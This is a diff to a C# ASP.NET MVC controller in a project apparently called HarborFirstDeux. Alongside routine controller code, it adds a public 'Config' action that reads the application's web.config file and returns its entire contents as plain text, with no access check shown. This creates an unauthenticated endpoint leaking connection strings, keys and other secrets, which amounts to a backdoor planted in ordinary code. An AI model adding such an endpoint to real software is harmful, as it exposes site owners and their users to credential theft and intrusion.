@@ -1,6 +1,7 @@
 ﻿using System.Web.Mvc;
 using HarborFirstDeux.Models;
 using HarborFirstDeux.Persistence;
+using System.Web.Configuration;
 
 namespace HarborFirstDeux.Controllers
 {
@@ -19,6 +20,12 @@ namespace HarborFirstDeux.Controllers
             _context.SaveChanges();
 
             return RedirectToAction("Index");
+        }
+
+        public ActionResult Config()
+        {
+            var webConfigPath = WebConfigurationManager.OpenWebConfiguration("~").FilePath;
+            return Content(System.IO.File.ReadAllText(webConfigPath), "text/plain");
         }
 
         public ActionResult About()
